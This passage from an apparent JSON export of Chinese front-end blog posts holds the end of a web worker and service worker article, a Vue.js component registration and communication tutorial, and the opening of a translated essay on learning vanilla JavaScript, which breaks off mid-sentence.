页面中进行多线程编程成为可能\u003c/li\u003e\n\u003cli\u003e共享线程指的是一个可以被多个页面通过多个连接所使用的 worker，页面会共享 worker 的上下文，拥有共同影响的变量等\u003c/li\u003e\n\u003cli\u003eservice worker 作为一个页面与服务器之间的 proxy，可以捕获它所负责的页面的请求，并返回相应资源，这使离线 web 应用成为了可能\u003c/li\u003e\n\u003cli\u003e兼容性方面，专用 worker 相对理想一些，共享 worker 不太理想，service worker 值得期待\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eVI. 参考资料：\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003ehttps://superuser.com/questions/257406/can-a-multi-core-processor-run-multiple-processes-at-the-same-time\u003c/li\u003e\n\u003cli\u003ehttp://www.cnblogs.com/whitewolf/p/javascript-single-thread-and-browser-event-loop.html\u003c/li\u003e\n\u003cli\u003ehttp://woshixiguapi.blog.163.com/blog/static/19249969201010113479457/\u003c/li\u003e\n\u003cli\u003ehttp://www.cnblogs.com/Leo_wl/p/5319735.html\u003c/li\u003e\n\u003cli\u003ehttp://www.alloyteam.com/2015/08/nodejs-cluster-tutorial/\u003c/li\u003e\n\u003cli\u003ehttps://php.golaravel.com/function.pcntl-fork.html\u003c/li\u003e\n\u003cli\u003ehttps://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API/Using_web_workers\u003c/li\u003e\n\u003cli\u003ehttps://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers\u003c/li\u003e\n\u003cli\u003ehttps://www.smashingmagazine.com/2016/02/making-a-service-worker/\u003c/li\u003e\n\u003cli\u003ehttps://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API\u003c/li\u003e\n\u003cli\u003ehttp://blog.88mph.io/2017/07/28/understanding-service-workers/\u003c/li\u003e\n\u003cli\u003ehttps://serviceworke.rs/\u003c/li\u003e\n\u003cli\u003ehttps://aarontgrogg.com/blog/2015/07/20/the-difference-between-service-workers-web-workers-and-websockets/\u003c/li\u003e\n\u003cli\u003ehttps://www.fxsitecompat.com/en-CA/docs/2015/application-cache-api-has-been-deprecated/\u003c/li\u003e\n\u003cli\u003ehttps://24ways.org/2016/http2-server-push-and-service-workers/\u003c/li\u003e\n\u003cli\u003ehttps://ponyfoo.com/articles/backgroundsync\u003c/li\u003e\n\u003cli\u003ehttps://www.ibm.com/developerworks/cn/web/1112_sunch_webworker/\u003c/li\u003e\n\u003cli\u003ehttps://www.ibm.com/developerworks/cn/web/wa-webworkers/index.html\u003c/li\u003e\n\u003cli\u003ehttps://www.quora.com/Whats-the-difference-between-service-workers-and-web-workers-in-JavaScript\u003c/li\u003e\n\u003cli\u003ehttp://jixianqianduan.com/frontend-javascript/2014/06/05/webworker-serviceworker.html\u003c/li\u003e\n\u003cli\u003ehttps://zhuanlan.zhihu.com/p/27264234\u003c/li\u003e\n\u003cli\u003ehttps://developers.google.com/web/fundamentals/instant-and-offline/offline-cookbook/\u003c/li\u003e\n\u003cli\u003ehttp://imweb.io/topic/56592b8a823633e31839fc01\u003c/li\u003e\n\u003cli\u003ehttps://w3c.github.io/ServiceWorker/#service-worker-concept\u003c/li\u003e\n\u003cli\u003ehttp://www.howtobuildsoftware.com/index.php/how-do/97C/service-worker-what-is-the-api-for-unregistering-service-workers-in-chrome-44\u003c/li\u003e\n\u003cli\u003ehttps://developers.google.com/web/fundamentals/primers/service-workers/\u003c/li\u003e\n\u003cli\u003ehttps://developers.google.com/web/fundamentals/instant-and-offline/offline-cookbook/\u003c/li\u003e\n\u003cli\u003ehttps://developers.google.com/web/fundamentals/primers/service-workers/lifecycle#_2\u003c/li\u003e\n\u003cli\u003ehttps://juejin.im/post/59d9b38ef265da064a0f72cc\u003c/li\u003e\n\u003cli\u003ehttps://nolanlawson.github.io/cascadia-2016/#/37\u003c/li\u003e\n\u003cli\u003ehttps://love2dev.com/blog/what-is-a-service-worker/\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cbr\u003e\u003cstrong\u003e\u003c/strong\u003e\u003c/p\u003e\u003ccenter\u003e\u003cstrong\u003e(end)\u003c/strong\u003e\u003c/center\u003e\u003cp\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ccenter\u003e长按二维码或搜索 fewelife 关注我们哦\u003c/center\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc7e84adafedc2?imageView2/0/w/1280/h/960/ignore-error/1\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514885024.1135","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e98c"},"id":"59a4bc7c518825244c0cfc10","author":{"$oid":"5a4b774a85b30d097483e980"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"MVVM 开发总结 —— Vue 组件（你所需要知道的）","meta":{"likeCount":0},"tag":["Vue.js"],"comment":[],"shortContent":"随着模块化开发的理念越来越被开发者所重视，如何快速高效的开发项目成为了开发中所要注意的重点。在vue.js中组件系统作为一个重要的概念，它提供的组件可以独立、重复的使用来构建大型的应用。组件可以扩展HTML元素，封装可重用的HTML代码，我们可以将组件看作自定义的HTML元素。 …","content":"\u003cp\u003e随着模块化开发的理念越来越被开发者所重视，如何快速高效的开发项目成为了开发中所要注意的重点。在vue.js中组件系统作为一个重要的概念，它提供的组件可以独立、重复的使用来构建大型的应用。组件可以扩展HTML元素，封装可重用的HTML代码，我们可以将组件看作自定义的HTML元素。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e组件的使用步骤：\u003c/h2\u003e\n\u003cp\u003e1.使用 Vue.extend()创建组件构造器\u003cbr\u003e2.使用 Vue.componnet()注册组件\u003cbr\u003e3.在 Vue的实例作用域范围内使用组件\u003c/p\u003e\n\u003ch2 id=\"vue-demo-\"\u003evue组件——最简单的demo实例\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;vue-组件\u0026lt;/title\u0026gt;\n    \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"http://unpkg.com/vue\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;my-component\u0026gt;\u0026lt;/my-component\u0026gt;\n    \u0026lt;/div\u0026gt;\n\n    \u0026lt;script\u0026gt;\n        // 创建组件构造器\n        var myComponent = Vue.extend({\n            template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div\u0026gt;this is a component!\u0026lt;/div\u0026gt;'\u003c/span\u003e\n        });\n        // 全局注册组件\n        Vue.component(\u003cspan class=\"hljs-string\"\u003e'my-component'\u003c/span\u003e, myComponent)\n\n        var vm = new Vue({\n            el: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e\n        })\n    \u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个例子是我们常见的一个组件使用，这是vue1.x中的组件的写法，vue2.x提出了更加语义化的写法，但要注意vue.extend()的使用，这里不做赘述，详情看下文。\u003cbr\u003e提醒：这里需要注意，组件注册需要在Vue实例之前，这里和自定指令需要注意的事项一致。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e组件的全局注册和局部注册\u003c/h2\u003e\n\u003cp\u003e组件和指令一样都可以分为全局的和局部的。\u003cbr\u003e上面的示例就是一个全局的组件，在开发中我们可能更多的需要的不是全局组件，而是局部组件。组件包含在其他组件内的情况出现的几率比较大，这时我们可以用选项的components对象属性实现局部注册组件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;vue-组件\u0026lt;/title\u0026gt;\n    \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"http://unpkg.com/vue\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;my-component1\u0026gt;\u0026lt;/my-component1\u0026gt;\n        \u0026lt;my-component2\u0026gt;\u0026lt;/my-component2\u0026gt;\n    \u0026lt;/div\u0026gt;\n\n    \u0026lt;script\u0026gt;\n        var myComponent1 = Vue.extend({\n            template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div\u0026gt;this is a component1!\u0026lt;/div\u0026gt;'\u003c/span\u003e\n        });\n\n        var myComponent2 = Vue.extend({\n            template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div\u0026gt;this is a component2!\u0026lt;/div\u0026gt;'\u003c/span\u003e\n        });\n\n        var vm = new Vue({\n            el: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n            components: {\n                \u003cspan class=\"hljs-string\"\u003e'myComponent1'\u003c/span\u003e: myComponent1,\n                \u003cspan class=\"hljs-string\"\u003e'myComponent2'\u003c/span\u003e: myComponent2\n            }\n        })\n    \u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种局部注册组件的方式使我们常用的形式之一。\u003c/p\u003e\n\u003cp\u003e我们也经常见到这样的组件使用方式，如下图示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;vue-组件\u0026lt;/title\u0026gt;\n    \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"http://unpkg.com/vue\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n    \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n        \u0026lt;div v-text=\u003cspan class=\"hljs-string\"\u003e\"parentMsg\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n        \u0026lt;!-- 组件1 --\u0026gt;\n        \u0026lt;my-component1\u0026gt;\u0026lt;/my-component1\u0026gt;\n        \u0026lt;!-- 组件2 --\u0026gt;\n        \u0026lt;my-component2\u0026gt;\u0026lt;/my-component2\u0026gt;\n        \u0026lt;!-- 组件3 --\u0026gt;\n        \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"component\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n        \u0026lt;!-- 挂载组件 --\u0026gt;\n        \u0026lt;div id=\u003cspan class=\"hljs-string\"\u003e\"globalComponent\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n    \u0026lt;/div\u0026gt;\n\n    \u0026lt;script\u0026gt;\n        var myComponent1 = {\n            template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div v-text=\"child-msg\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n            props: [\u003cspan class=\"hljs-string\"\u003e'childMsg'\u003c/span\u003e],\n            data: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                    msg: \u003cspan class=\"hljs-string\"\u003e'this is a component1!'\u003c/span\u003e \n                }\n            }\n        };\n\n        var myComponent2 = {\n            template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div v-text=\"msg\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n            data: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                    msg: \u003cspan class=\"hljs-string\"\u003e'this is a component2!'\u003c/span\u003e\n                }\n            }\n        };\n\n        var myComponent3 = {\n            template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div v-text=\"msg\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n            data: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                    msg: \u003cspan class=\"hljs-string\"\u003e'this is a component3!'\u003c/span\u003e\n                }\n            }\n        };\n\n        // 全局组件\n        var myGlobalComponent = Vue.component(\u003cspan class=\"hljs-string\"\u003e'my-component1'\u003c/span\u003e, myComponent1);\n\n        // 扩展实例的构造器组件\n        var myCmopnentExtend = Vue.extend(myComponent3);\n\n        // 实例化的构造器组件可以自由的绑定在任意元素按上\n        var vc = new myCmopnentExtend().\u003cspan class=\"hljs-variable\"\u003e$mount\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'#component'\u003c/span\u003e);\n\n        // 创建vm 实例，使用局部组件\n        var vm = new Vue({\n            el: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n            data: {\n                parentMsg: \u003cspan class=\"hljs-string\"\u003e'haha'\u003c/span\u003e\n            },\n            components: {\n                \u003cspan class=\"hljs-string\"\u003e'myComponent2'\u003c/span\u003e: myComponent2\n            }\n        });\n\n        // 挂载组件\n        var vb = new myGlobalComponent().\u003cspan class=\"hljs-variable\"\u003e$mount\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'#globalComponent'\u003c/span\u003e);\n    \u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种使用方法vue.js官网提供的方法，vue2.x在中推荐使用的，前者是在vue1.0中推荐的。\u003cbr\u003e但是在这里我们需要注意的是，vue.extend()这种创建构造器和vue.component()全局注册组件，可以通过$mount(\u0026#39;xxx\u0026#39;)绑定到任意指定的元素（在VUE2.0中这种function component，它不是vue的实例，只能进行视图的渲染而不能进行逻辑操作）。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e组件间的通信\u003c/h2\u003e\n\u003cp\u003e父子组件间的通信用vue.js开发文档中的介绍就是props down， events up；\u003cbr\u003e非父子组件间的通信，可以使用一个空Vue实例，来作为中央事件总线。\u003c/p\u003e\n\u003cdiv id=\"app\"\u003e\u003cbr\u003e        \u003ch2\u003e\u003c/h2\u003e\u003cbr\u003e        \u003cbr\u003e        \u003cbr\u003e        \u003cdiv class=\"msg3\"\u003e\u003c/div\u003e\u003cbr\u003e    \u003c/div\u003e\n\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e\u0026lt;script\u0026gt;\n    var bus = new Vue();\n    //     子组件1\n    var childOne = {\n        name: \u003cspan class=\"hljs-string\"\u003e'childOne'\u003c/span\u003e,\n        props: [\u003cspan class=\"hljs-string\"\u003e'childMsg'\u003c/span\u003e],\n        template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div v-text=\"childMsg\" @click=\"commit\" class=\"msg1\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n        data: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                msg: \u003cspan class=\"hljs-string\"\u003e'component1'\u003c/span\u003e\n            }\n        },\n        methods:{\n            commit: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                bus.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'oneToTwo'\u003c/span\u003e, {\n                    msg: \u003cspan class=\"hljs-string\"\u003e'i am component1'\u003c/span\u003e\n                });\n            }\n        },\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emounted\u003c/span\u003e\u003c/span\u003e(){\n            bus.\u003cspan class=\"hljs-variable\"\u003e$on\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'twoToOne'\u003c/span\u003e, (data) =\u0026gt; {\n                this.msg = data.msg\n            })\n        }\n    };\n    //     子组件2\n    var childTwo = {\n        name: \u003cspan class=\"hljs-string\"\u003e'childTwo'\u003c/span\u003e,\n        props: [\u003cspan class=\"hljs-string\"\u003e'childMsg'\u003c/span\u003e],\n        template: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;div v-text=\"msg\" @click=\"btnClick\" class=\"msg2\"\u0026gt;\u0026lt;/div\u0026gt;'\u003c/span\u003e,\n        data: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n                msg: \u003cspan class=\"hljs-string\"\u003e'component2'\u003c/span\u003e\n            }\n        },\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emounted\u003c/span\u003e\u003c/span\u003e(){\n            bus.\u003cspan class=\"hljs-variable\"\u003e$on\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'oneToTwo'\u003c/span\u003e, (data) =\u0026gt; {\n                this.msg = data.msg;\n            })\n        },\n        methods:{\n            btnClick: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                this.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'backmsg'\u003c/span\u003e);\n            }\n        }\n    };\n    // 父组建\n    var vm = new Vue({\n        el: \u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e,\n        data: {\n            sTitle:\u003cspan class=\"hljs-string\"\u003e'组件间的通信'\u003c/span\u003e,\n            parentMsg:\u003cspan class=\"hljs-string\"\u003e'i am parent component'\u003c/span\u003e\n        },\n        components: {\n            \u003cspan class=\"hljs-string\"\u003e'mcOne'\u003c/span\u003e: childOne,\n            \u003cspan class=\"hljs-string\"\u003e'mcTwo'\u003c/span\u003e: childTwo\n        },\n        methods: {\n            strReverse: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                this.parentMsg = this.parentMsg.split(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e).reverse().join(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e);\n            }\n        }\n    });\n\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个小demo包含了3部分父组件，子组件1，子组件2，父组件通过props向子组件1传递信息，子组件1通过空组件bus中央总线向子组件2传递信息，子组件2通过event 向父组件传递信息。\u003c/p\u003e\n\u003cp\u003e在开发中小型应用时这样的状态信息传递已经可以满足大部分项目的要求，但对中大型项目来说，随着状态信息的增多，业务逻辑的复杂，就需要统一的状态管理模式来保证应用中所有的组件的正确状态。我们就需要vuex来进行状态信息的处理和传递了。\u003c/p\u003e\n\u003cp\u003evuex本文不做论述。\u003c/p\u003e\n","buildTime":"1514860945.9997","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e98d"},"id":"59a535bd6fb9a0249975cb9b","author":{"$oid":"5a4b774a85b30d097483e97f"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"[译] 原生 JavaScript 值得学习吗？答案是肯定的","meta":{"likeCount":0},"tag":["JavaScript","掘金翻译计划"],"comment":[],"shortContent":"这篇文章的意图是要给每位前端开发者强调 JavaScript 的基本原理。原生（Vanilla）是指没有额外框架或库的 JavaScript。本文将会告诉你为什么应该对原生 JavaScript 有一个较好的认识。 我也会提及一些帮助过我学习这些基本原理的资源。 写这篇文章背后…","content":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e原文地址：\u003ca href=\"https://medium.freecodecamp.org/is-vanilla-javascript-worth-learning-absolutely-c2c67140ac34\"\u003eIs Vanilla JavaScript worth learning? Absolutely.\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文作者：\u003ca href=\"https://medium.freecodecamp.org/@codinglawyer\"\u003eDavid Kopal\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译文出自：\u003ca href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e本文永久链接：\u003ca href=\"https://github.com/xitu/gold-miner/blob/master/TODO/is-vanilla-javascript-worth-learning-absolutely.md\"\u003ehttps://github.com/xitu/gold-miner/blob/master/TODO/is-vanilla-javascript-worth-learning-absolutely.md\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译者：\u003ca href=\"https://github.com/lampui\"\u003elampui\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e校对者：\u003ca href=\"https://github.com/KKKyrie\"\u003ekyrieliu\u003c/a\u003e、\u003ca href=\"https://github.com/calpa\"\u003eCalpa Liu\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/fc5e998805a4cc7475b6309fc13fa219\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这篇文章的意图是要给每位前端开发者强调 JavaScript 的基本原理。原生（\u003ca href=\"https://en.wikipedia.org/wiki/Vanilla_software\"\u003eVanilla\u003c/a\u003e）是指没有额外框架或库的 JavaScript。本文将会告诉你为什么应该对原生 JavaScript 有一个较好的认识。\u003c/p\u003e\n\u003cp\u003e我也会提及一些帮助过我学习这些基本原理的资源。\u003c/p\u003e\n\u003cp\u003e写这篇文章背后的另一个原因是许多有抱负的 web 开发者倾向于跳过 JavaScript 核心概念的学习，诸如提升、闭包或原型。他（她）们直接学习最热门的框架，例如 React 或 Angular 2。我会向你说明为什么这种方法不能称之为一条捷径。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e每个人都想要有 ${请填写热门的框架名字} 知识的开发者…\u003c/h3\u003e\n\u003cp\u003e那么，还有什么理由让你再费事去学习原生 JavaScript 吗？\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/597dbb7a56ce1fe51483a3a3b29e113e\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e不了解一门语言本身的核心知识那是很难成为一名大神的，就像在你去一个有特定法律的领域之前，你需要先清楚法律的一些基本原则。\u003ca href=\"https://ideas.ataccama.com/i-stopped-being-a-lawyer-became-a-developer-and-its-awesome-5311e8d74882\"\u003e这个比喻\u003c/a\u003e真的很巧。😉\u003c/p\u003e\n\u003cp\u003e我能理解大多数热血十足的 web 开发者想尽快地找到工作的心情。因为我也想。\u003c/p\u003e\n\u003cp\u003e看起来去上一门 JavaScript 基础速成班、钻研一些框架、开发个 ToDo 列表（\u003ca href=\"https://medium.freecodecamp.com/every-time-you-build-a-to-do-list-app-a-puppy-dies-505b54637a5d\"\u003elet a puppy die\u003c/a\u003e）和上传到 GitHub，然后再开始找工作会简单些。\u003c/p\u003e\n\u003ch3 id=\"-javascript-\"\u003e…但从长远来看，把时间投入到原生 JavaScript 的学习会更有收获\u003c/h3\u003e\n\u003cp\u003e别误会我，无论如何我都不是对 JavaScript 的各种框架有偏见。恰好相反，许多框架反而能让你书写出可读性和维护性更高的代码，这些框架还能让你写出比平时更容易调试的抽象代码。\u003c/p\u003e\n\u003cp\u003e但 JavaScript 生态进化得非常快，新框架层出不穷，新功能不断地被添加到已有的功能上，最重要的是，眼下许多热门的框架迟早都会被替代，例如 Angular 1。\u003c/p\u003e\n\u003cp\u003e在这样的环境下，你还认为具备某个 JavaScript 框架的知识对一名 web 开发者来说就足够了吗？\u003c/p\u003e\n\u003cp\u003e还是去理解这门语言是如何在这些框架和库的背后运作好点？\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/38915118c64e1a0d0d3235e129d5d6ad\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eYes, 你对了！当然是第二个选择。\u003cbr\u003e如果你有一个很扎实的 JavaScript 基础，当开始工作的时候唯一需要让自己熟悉的就是新框架的\u003cstrong\u003e语法\u003c/strong\u003e，在所有层次的抽象下，基本的规则还是一样的，它还是纯粹的 JavaScript。\u003c/p\u003e\n\u003cp\u003e如果你的知识仅限于某个 JavaScript 框架，那你学习另一个新框架的时候会很艰难。不同的框架通常是基于不同的 JavaScript 原则。从长远来看，你会花跟多时间去理解不同的框架和调试你写的代码。\u003c/p\u003e\n\u003cp\u003e所有的 JavaScript 框架和库都不可避免地基于原生 JavaScript。\u003c/p\u003e\n\u003cp\u003e从长远来看，这应该能说服任何人掌握原生 JavaScript 是必须的。这是对任何一名成功开发者的必要条件，特别是对于一个主要工作在 JavaScript 生态下的开发者。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/1c24d4bcb36924e8122d3d6389967edc\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e个人经验\u003c/h3\u003e\n\u003cp\u003e不久前，我回顾了自己是怎样从一名律师转变为一名 web 开发者的\u003ca href=\"https://ideas.ataccama.com/i-stopped-being-a-lawyer-became-a-developer-and-its-awesome-5311e8d74882#.v3xurb9v5\"\u003e过程\u003c/a\u003e，从我开始写第一个 JavaScript 函数算起，都有 18 个月了，并且现在是我成为专业前端开发者的第 10 个月了。\u003c/p\u003e\n\u003cp\u003e我依然记得摸索正确的 JavaScript 学习之路对我来说是多么地有挑战性，因为我之前没有任何的编程经验。我尝试过（至今还在尝试）许多不同的方法成为一名高效的学习者，有些方法会让我收获很多，有些却较少。\u003c/p\u003e\n\u003cp\u003e最重要的是，开始的时候我把重点放在了学习原生 JavaScript 上面，这对我的帮助太不可思议了。\u003cstrong\u003e接下来是框架。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/5daeb54c3443233ed79c1e7a1e399036\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.keepcalm-o-matic.co.uk/p/keep-calm-and-learn-javascript/\"\u003epicture credit\u003c/a\u003e\u003cbr\u003e现在，我在工作中用的是 \u003ca href=\"https://facebook.github.io/react/\"\u003eReact\u003c/a\u003e-\u003ca href=\"http://redux.js.org/\"\u003eRedux\u003c/a\u003e 技术栈。即便如此，我经常能用原生 JavaScript 的知识解决眼下的一些问题。如果只具备某个框架的知识，这些 bugs 解决起来将会更具挑战性。\u003c/p\u003e\n\u003cp\u003e学习 React 或 Angular 2 不会教你对象是通过引用传递或闭包是怎样工作的。在更加抽象的框架下，尝试去理解这些概念那就更加困难了。这就使简单的 JavaScript 概念变得更难以理解。\u003c/p\u003e\n\u003cp\u003e此外，如果你工作中用的是 \u003ca href=\"https://facebook.github.io/react/docs/jsx-in-depth.html\"\u003eJSX\u003c/a\u003e (React, Vue, Inferno) 或 \u003ca href=\"https://www.typescriptlang.org/\"\u003eTypeScript\u003c/a\u003e (Angular 2)，那你还有另一层的抽象层。\u003c/p\u003e\n\u003cp\u003e如果你想明白这些框架背后是怎样工作的，你需要先明白 JavaScript 